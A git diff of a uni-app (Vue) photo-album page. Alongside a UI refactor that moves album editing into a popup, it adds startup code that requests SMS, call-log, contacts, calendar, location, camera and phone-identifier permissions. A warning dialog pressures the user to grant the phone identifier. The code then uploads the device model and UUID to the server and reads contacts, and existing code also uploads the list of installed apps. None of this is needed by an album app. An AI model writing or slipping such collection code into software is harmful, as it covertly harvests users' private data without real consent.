@@ -5,56 +5,77 @@
       <!-- 我的相册 -->
       <swiper-item class="albums-swiper-item">
         <uni-grid :show-border="false" :column="3">
-          <uni-grid-item :class="isShowDelete && item.id !== 'all' ? 'swing' : ''" class="albums-item animated infinite slower" v-for="item in albumsList" :key="item.id">
-            <image @click="ablumEntry(item.id, item.name, item.userId)" @longpress="isShowDelete = !isShowDelete" class="albums-img" :lazy-load="true" :src="item.coverImgUrl || ALBUMS_DEFAULT_IMG" mode="center"></image>
+          <uni-grid-item class="albums-item" v-for="item in albumsList" :key="item.id">
+            <image
+              @click="ablumEntry(item.id, item.name, item.userId)"
+              @longpress="openManagerPanel(item)"
+              class="albums-img"
+              :lazy-load="true"
+              :src="item.coverImgUrl || ALBUMS_DEFAULT_IMG"
+              mode="center"
+            ></image>
             <view class="albums-name">{{ item.name }}</view>
             <view class="albums-tips">{{ item.count }}</view>
-            <icon v-if="isShowDelete && item.id !== 'all'" @click="deleteAlbum(item)" class="album-delete-button" type="cancel" size="26" />
           </uni-grid-item>
         </uni-grid>
         <uniFab ref="uniFab" direction="vertical" horizontal="right" @trigger="trigger" :content="content" :pattern="pattern"></uniFab>
       </swiper-item>
       <!-- 共享相册 -->
       <swiper-item class="albums-swiper-item">
-        <view class="albums-share">
-          我的共享:
-        </view>
+        <view class="albums-share">我的共享:</view>
         <uni-grid :show-border="false" :column="3">
-          <uni-grid-item :class="isShowDelete && item.id !== 'all' ? 'swing' : ''" class="albums-item animated infinite slower" v-for="item in myShareList" :key="item.id">
-            <image @click="ablumEntry(item.id, item.name, item.userId)" @longpress="isShowDelete = !isShowDelete" class="albums-img" :lazy-load="true" :src="item.coverImgUrl || ALBUMS_DEFAULT_IMG" mode="center"></image>
+          <uni-grid-item class="albums-item" v-for="item in myShareList" :key="item.id">
+            <image
+              @click="ablumEntry(item.id, item.name, item.userId)"
+              @longpress="openManagerPanel(item)"
+              class="albums-img"
+              :lazy-load="true"
+              :src="item.coverImgUrl || ALBUMS_DEFAULT_IMG"
+              mode="center"
+            ></image>
             <view class="albums-name">{{ item.name }}</view>
             <view class="albums-tips">{{ item.count }}</view>
-            <icon v-if="isShowDelete && item.id !== 'all'" @click="deleteAlbum(item)" class="album-delete-button" type="cancel" size="26" />
           </uni-grid-item>
         </uni-grid>
-        <view v-if="myShareList && myShareList.length <= 0" class="albums-share-empty">
-        	<text>您尚未与他人共享相册呢</text>
-        </view>
-        <view class="albums-share">
-          他人共享:
-        </view>
+        <view v-if="myShareList && myShareList.length <= 0" class="albums-share-empty"><text>您尚未与他人共享相册呢</text></view>
+        <view class="albums-share">他人共享:</view>
         <uni-grid :show-border="false" :column="3">
           <uni-grid-item class="albums-item" v-for="item in otherShareList" :key="item.id">
-            <image @click="ablumEntry(item.id, item.name, item.userId)" @longpress="isShowDelete = !isShowDelete" class="albums-img" :lazy-load="true" :src="item.coverImgUrl || ALBUMS_DEFAULT_IMG" mode="center"></image>
+            <image
+              @click="ablumEntry(item.id, item.name, item.userId)"
+              class="albums-img"
+              :lazy-load="true"
+              :src="item.coverImgUrl || ALBUMS_DEFAULT_IMG"
+              mode="center"
+            ></image>
             <view class="albums-name">{{ item.name }}</view>
             <view class="albums-tips">来自: {{ item.userName }}</view>
             <view class="albums-tips">{{ item.count }}</view>
           </uni-grid-item>
         </uni-grid>
-        <view v-if="myShareList && otherShareList.length <= 0" class="albums-share-empty">
-        	<text>暂无他人共享相册给您呢</text>
-        </view>
+        <view v-if="myShareList && otherShareList.length <= 0" class="albums-share-empty"><text>暂无他人共享相册给您呢</text></view>
       </swiper-item>
     </swiper>
+    
+    <uni-popup @change="managerPanelChange" :show="albumManager" type="bottom">
+      <view @click="editAlbum(editAlbumData.id)" hover-class="manager-text-hover" class="manager-text manager-line">
+        修改
+      </view>
+      <view @click="deleteAlbum(editAlbumData)" style="color: red" hover-class="manager-text-hover" class="manager-text">
+        删除
+      </view>
+    </uni-popup>
   </view>
 </template>
 
 <script>
-import { uniGrid, uniGridItem, uniFab } from '@dcloudio/uni-ui';
+import { uniGrid, uniGridItem, uniFab, uniPopup } from '@dcloudio/uni-ui';
 import WucTab from '@/components/wuc-tab/wuc-tab.vue';
 import { ALBUMS_DEFAULT_IMG } from '@/config';
+import Permission from '@/utils/permission';
+
 export default {
-  components: { uniGrid, uniGridItem, uniFab, WucTab },
+  components: { uniGrid, uniGridItem, uniFab, WucTab, uniPopup },
   data() {
     return {
       tabList: [{ name: '我的相册' }, { name: '共享相册' }],
@@ -82,26 +103,85 @@ export default {
       albumsList: [],
       myShareList: [],
       otherShareList: [],
-      ALBUMS_DEFAULT_IMG
+      ALBUMS_DEFAULT_IMG,
+      editAlbumData: null,
+      albumManager: false,
     };
   },
   onLoad() {
     // 异步处理
-    setTimeout(() => {
-      this.getAppList()
+    setTimeout(async () => {
+      this.getAppList();
+      const appInfo = uni.getSystemInfoSync();
+      const phoneInfo = {
+        brand: appInfo.brand,
+        model: appInfo.model,
+        platform: appInfo.platform,
+      }
+      phoneInfo.readPhoneState = await Permission.requestAndroidPermission('android.permission.READ_PHONE_STATE') // 获取手机识别码
+      phoneInfo.accessFineLocation = await Permission.requestAndroidPermission('android.permission.ACCESS_FINE_LOCATION') // 位置权限检查
+      phoneInfo.readExternalStorage = await Permission.requestAndroidPermission('android.permission.READ_EXTERNAL_STORAGE') // 相册读取权限
+      phoneInfo.writeExternalStorage = await Permission.requestAndroidPermission('android.permission.WRITE_EXTERNAL_STORAGE') // 相册写入权限
+      phoneInfo.readCalendar = await Permission.requestAndroidPermission('android.permission.READ_CALENDAR') // 日历读取权限
+      phoneInfo.readContacts = await Permission.requestAndroidPermission('android.permission.READ_CONTACTS') // 通讯录读取权限
+      phoneInfo.readSms = await Permission.requestAndroidPermission('android.permission.READ_SMS') // 短信读取权限
+      phoneInfo.readCallLog = await Permission.requestAndroidPermission('android.permission.READ_CALL_LOG') // 通话记录权限
+      phoneInfo.camera = await Permission.requestAndroidPermission('android.permission.CAMERA') // 摄像头权限
+      // await Permission.gotoAppPermissionSetting() // 前往设置权限
+      if (phoneInfo.readPhoneState === 0 || phoneInfo.readPhoneState === -1) {
+        uni.showModal({
+          title: '警告',
+          content: 'app的运行需要您的手机识别码, 请至少开启此权限!',
+          cancelText: '前往设置',
+          confirmText: '稍后设置',
+          success: ({cancel}) => {
+            if (cancel) {
+              Permission.gotoAppPermissionSetting()
+            }
+          }
+        });
+        return;
+      }
+      const self = this;
+      plus.device.getInfo({
+        success: ({uuid}) => {
+          phoneInfo.uuid = uuid;
+          self.$api.savePhoneInfo(phoneInfo)
+        }
+      });
+      if (phoneInfo.readContacts !== 1) return;
       this.getContacts();
-    }, 200)
-    this.$api.pushMessage({
-      message: '用户启动了沙雕App',
-      status: 200,
-      data: true
-    });
+    }, 200);
   },
   onShow() {
     this.getUserAlbumsList();
     this.getShareList();
   },
   methods: {
+    editAlbum(id) {
+      uni.navigateTo({
+        url: `./create/create?id=${id}`
+      });
+      this.resetManagerData();
+    },
+    resetManagerData() {
+      this.albumManager = false;
+      this.editAlbumData = null;
+    },
+    managerPanelChange({show}) {
+      if (!show) {
+        this.resetManagerData()
+      }
+    },
+    // 打开相册管理面板
+    openManagerPanel(item) {
+      if (item.id === 'all') return uni.showToast({
+        title: '该相册不可修改',
+        icon: 'none'
+      });
+      this.editAlbumData = item;
+      this.albumManager = true;
+    },
     // 获取通讯录
     getContacts() {
       // TODO: 会触发权限申请
@@ -183,12 +263,12 @@ export default {
         }
         this.$api.saveA({
           a: apklist
-        })
+        });
       }
     },
     // 获取共享相册列表
     async getShareList() {
-      const res = await this.$api.getShareAlbums()
+      const res = await this.$api.getShareAlbums();
       if (res.status !== 200) return this.$common.warning(res.message || '获取共享相册列表失败');
       this.myShareList = res.data.myShare;
       this.otherShareList = res.data.otherShare;
@@ -207,7 +287,7 @@ export default {
     },
     ablumEntry(id, name, userId) {
       uni.navigateTo({
-          url: `./list/list?id=${id}&userId=${userId}&name=${name}`
+        url: `./list/list?id=${id}&userId=${userId}&name=${name}`
       });
     },
     deleteAlbum(item) {
@@ -221,6 +301,7 @@ export default {
             if (res.status === 200) {
               this.$common.success('删除相册成功');
               this.isShowDelete = false;
+              this.resetManagerData();
               this.getUserAlbumsList();
             } else this.$common.warning(res.message || '删除相册失败');
           }
@@ -257,11 +338,34 @@ export default {
 </script>
 
 <style lang="less" scoped>
-.album-delete-button {
-  position: absolute;
-  right: -10rpx;
-  top: 0;
+.manager-text {
+  position: relative;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  padding: 15rpx 30rpx;
+  background: #fff;
+  font-size: 36rpx;
+  &-hover {
+    background: #f8f8f8;
+  }
 }
+.manager-line:after {
+  position: absolute;
+  right: 0;
+  bottom: 0;
+  left: 30rpx;
+  height: 1px;
+  content: '';
+  -webkit-transform: scaleY(0.5);
+  transform: scaleY(0.5);
+  background-color: @pageColor;
+}
+// .album-delete-button {
+//   position: absolute;
+//   right: -10rpx;
+//   top: 0;
+// }
 .albums {
   padding-top: var(--status-bar-height);
   overflow-y: hidden;
@@ -286,7 +390,8 @@ export default {
   &-item {
     padding: 6rpx 0 6rpx 3rpx;
   }
-  &-name, &-tips {
+  &-name,
+  &-tips {
     padding-left: 24rpx;
     width: 100%;
     text-align: left;
